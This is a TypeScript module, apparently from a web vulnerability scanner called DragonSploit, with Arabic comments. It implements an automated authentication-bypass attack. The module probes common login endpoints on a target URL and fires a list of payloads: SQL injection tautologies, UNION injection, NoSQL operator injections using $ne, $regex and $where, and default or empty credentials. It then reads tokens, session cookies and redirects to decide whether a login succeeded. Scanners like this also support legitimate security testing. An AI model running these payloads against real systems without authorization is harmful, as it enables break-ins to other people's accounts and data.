import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { URL, URLSearchParams } from 'url';
import { recordVulnerability, executeRequest, RequestResult } from './common';
import axios, { AxiosRequestConfig } from 'axios'; // نحتاج axios للـ POST المخصص هنا

// ============================================================================
// 🛠️ TYPES & INTERFACES
// ============================================================================

type PayloadValue = string | { [key: string]: any };

interface BypassPayload {
    email: PayloadValue;
    password: PayloadValue;
}

interface BypassTechnique {
    name: string;
    payload: BypassPayload;
}

// ============================================================================
// 🛡️ ATTACK LOGIC
// ============================================================================

export async function executeAuthBypassAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 0] 🔓 Starting Authentication Bypass Attack...');
    
    let foundVulnerability = false;

    // قائمة نقاط النهاية المحتملة لتسجيل الدخول (Common Login Endpoints)
    const loginEndpoints = [
        '/rest/user/login',
        '/api/login',
        '/login',
        '/signin',
        '/auth/login',
        '/api/v1/auth/login',
        '/user/login'
    ];

    // تقنيات التخطي (Attack Dictionary)
    const bypassTechniques: BypassTechnique[] = [
        // --- Classic SQL Injection ---
        { name: "Classic SQLi (OR 1=1)", payload: { email: "' OR 1=1 --", password: "password" } },
        { name: "Admin Tautology", payload: { email: "admin'--", password: "password" } },
        { name: "Password Bypass", payload: { email: "admin", password: "' OR '1'='1" } },
        { name: "UNION Auth Bypass", payload: { email: "' UNION SELECT 1, 'admin', 'hash' --", password: "password" } },
        
        // --- NoSQL Injection (MongoDB/CouchDB) ---
        { name: "NoSQLi (Not Equal)", payload: { email: { "$ne": "null" }, password: { "$ne": "null" } } },
        { name: "NoSQLi (Regex Wildcard)", payload: { email: { "$regex": ".*" }, password: { "$regex": ".*" } } },
        { name: "NoSQLi (JS Injection)", payload: { email: "admin", password: { "$where": "function(){return true}" } } },

        // --- Logic Flaws ---
        { name: "Default Creds (Admin/Admin)", payload: { email: "admin", password: "admin" } },
        { name: "Empty Password", payload: { email: "admin", password: "" } },
        { name: "SQL Wildcard (*)", payload: { email: "*", password: "*" } }
    ];

    // حلقة فحص نقاط النهاية
    for (const endpoint of loginEndpoints) {
        // بناء الرابط الكامل بشكل آمن
        const loginUrl = new URL(endpoint, targetUrl).toString();
        
        // تحقق سريع: هل نقطة النهاية موجودة أصلاً؟ (وفر الوقت)
        // نرسل GET خفيف أولاً، إذا كان 404 نتخطاه
        const checkProbe = await executeRequest(loginUrl);
        if (checkProbe.status === 404) continue;

        console.log(`[Vector 0] Testing endpoint: ${loginUrl}`);

        // تجربة التقنيات
        for (const technique of bypassTechniques) {
            try {
                // إعداد الطلب (Request Configuration)
                const config: AxiosRequestConfig = {
                    method: 'POST',
                    url: loginUrl,
                    data: technique.payload,
                    headers: { 
                        'User-Agent': 'DragonSploit/2.0 (Auth Scanner)',
                        'Content-Type': 'application/json'
                    },
                    timeout: 10000,
                    validateStatus: () => true // قبول كل الرموز للتحليل
                };

                // تنفيذ الطلب باستخدام Axios مباشرة هنا لأننا نحتاج POST مع Data معقدة
                // (يمكن دمج هذا في executeRequest مستقبلاً لتوحيد الأداء)
                let response = await axios(config);

                // Fallback: إذا فشل JSON (415)، جرب Form-Encoded
                if (response.status === 415 || response.status === 406) {
                    const params = new URLSearchParams();
                    for (const [key, val] of Object.entries(technique.payload)) {
                        const strVal = typeof val === 'object' ? JSON.stringify(val) : String(val);
                        params.append(key, strVal);
                    }
                    
                    config.headers!['Content-Type'] = 'application/x-www-form-urlencoded';
                    config.data = params;
                    response = await axios(config);
                }

                // --- Intelligent Success Analysis (تحليل النجاح الذكي) ---
                const responseBodyStr = JSON.stringify(response.data || "").toLowerCase();
                const responseHeadersStr = JSON.stringify(response.headers).toLowerCase();

                // المؤشرات القوية (Strong Indicators)
                const hasAuthToken = /token|bearer|jwt|access_key/.test(responseBodyStr) && responseBodyStr.length < 5000; // تجنب الإيجابيات الكاذبة في صفحات HTML الطويلة
                const setsSessionCookie = /set-cookie/.test(responseHeadersStr) && /session|sid|auth|user/.test(responseHeadersStr);
                
                // المؤشرات السلوكية (Behavioral Indicators)
                // 302 Redirect إلى صفحة Dashboard أو Home
                const isRedirectSuccess = (response.status === 302 || response.status === 301) && 
                                          /dashboard|home|account|profile/.test(response.headers['location'] || "");
                
                // رسائل ترحيبية في الرد
                const hasWelcomeMessage = /welcome|logged in|success|authenticated/.test(responseBodyStr);

                if (hasAuthToken || setsSessionCookie || isRedirectSuccess || (response.status === 200 && hasWelcomeMessage)) {
                    console.log(`[Vector 0] ✅ AUTH BYPASS CONFIRMED: ${technique.name}`);
                    
                    const proof = `
                        Endpoint: ${loginUrl}
                        Technique: ${technique.name}
                        Payload: ${JSON.stringify(technique.payload)}
                        Status: ${response.status}
                        Indicators: ${hasAuthToken ? 'Token Found ' : ''}${setsSessionCookie ? 'Session Cookie ' : ''}${isRedirectSuccess ? 'Redirected ' : ''}
                    `.trim();

                    const description = `Authentication Bypass vulnerability detected using '${technique.name}'. The scanner successfully logged in without valid credentials.`;
                    
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
                    foundVulnerability = true;
                    
                    // توقف فوراً عند العثور على ثغرة لتوفير الوقت (Fail-Fast / Succeed-Fast)
                    // إلا إذا كنت تريد جمع كل الطرق الممكنة
                    return true; 
                }

            } catch (error: any) {
                // تجاهل أخطاء الشبكة العابرة، وسجل الأخطاء المنطقية فقط
                if (!error.message.includes('timeout') && !error.message.includes('ECONNRESET')) {
                    console.warn(`[Vector 0] ⚠️ Error testing ${technique.name} on ${loginUrl}: ${error.message}`);
                }
            }
        }
    }

    return foundVulnerability;
}